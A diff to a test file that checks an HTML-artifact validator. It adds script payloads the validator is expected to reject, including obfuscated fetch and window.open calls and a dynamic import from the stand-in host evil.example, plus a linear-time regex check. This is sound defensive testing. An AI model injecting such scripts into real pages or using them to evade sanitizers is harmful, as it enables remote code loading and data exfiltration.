@@ -187,10 +187,22 @@ describe("validateAndNormalizeOpenUIHtmlArtifact", () => {
 			"<div onclick='alert(1)'>x</div>",
 			"<script src='https://example.com/x.js'></script>",
 			"<script>fetch('https://example.com')</script>",
+			'<script>globalThis["fetch"](u)</script>',
+			'<script>window["open"](u)</script>',
+			"<script>window?.open(u)</script>",
+			'<script>import("https://evil.example/x.js")</script>',
+			"<script>location.assign(u)</script>",
 			"<a href='javascript:alert(1)'>x</a>",
 		]) {
 			expect(validateAndNormalizeOpenUIHtmlArtifact({ title: "t", document }).ok).toBe(false);
 		}
+	});
+
+	it("matches network patterns in linear time on whitespace-heavy input", () => {
+		const spaces = " ".repeat(100_000);
+		const start = Date.now();
+		expect(validateAndNormalizeOpenUIHtmlArtifact({ title: "t", document: `<div>${spaces}</div>` }).ok).toBe(true);
+		expect(Date.now() - start).toBeLessThan(1000);
 	});
 
 	it("enforces the 1 MiB limit", () => {
